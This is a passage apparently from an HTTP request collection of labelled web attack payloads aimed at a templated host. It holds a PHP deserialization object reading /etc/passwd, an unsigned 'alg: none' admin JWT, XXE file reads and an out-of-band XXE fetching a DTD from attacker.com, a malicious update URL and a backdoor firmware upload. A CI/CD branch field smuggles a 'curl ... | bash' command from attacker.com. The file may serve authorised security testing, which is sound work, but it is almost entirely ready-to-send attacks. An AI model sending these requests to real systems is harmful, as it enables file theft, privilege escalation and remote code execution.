Content-Length: 80

data=O:8:"stdClass":1:{s:4:"file";s:11:"/etc/passwd";}

### Unsigned JWT Modification
GET /api/admin HTTP/1.1
Host: {{host}}
Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.

### XML External Entity (XXE)
POST /api/xml HTTP/1.1
Host: {{host}}
Content-Type: application/xml
Content-Length: 150

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<user><name>&xxe;</name></user>

### XXE - Blind OOB
POST /api/xml HTTP/1.1
Host: {{host}}
Content-Type: application/xml
Content-Length: 200

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>
<user><name>test</name></user>

### Supply Chain Attack - Malicious Package
POST /api/install HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 45

{"package": "malicious-package", "version": "1.0.0"}

### Code Injection via Update
POST /api/update HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 60

{"version": "1.0.0", "update_url": "http://evil.com/malware"}

### Unsigned Firmware Upload
POST /api/firmware/upload HTTP/1.1
Host: {{host}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: 100

------WebKitFormBoundary
Content-Disposition: form-data; name="firmware"; filename="backdoor.bin"

[BINARY_DATA]
------WebKitFormBoundary--

### CI/CD Pipeline Injection
POST /api/deploy HTTP/1.1
Host: {{host}}
Content-Type: application/json
Content-Length: 80

{"branch": "main; curl http://attacker.com/shell.sh | bash", "env": "prod"}
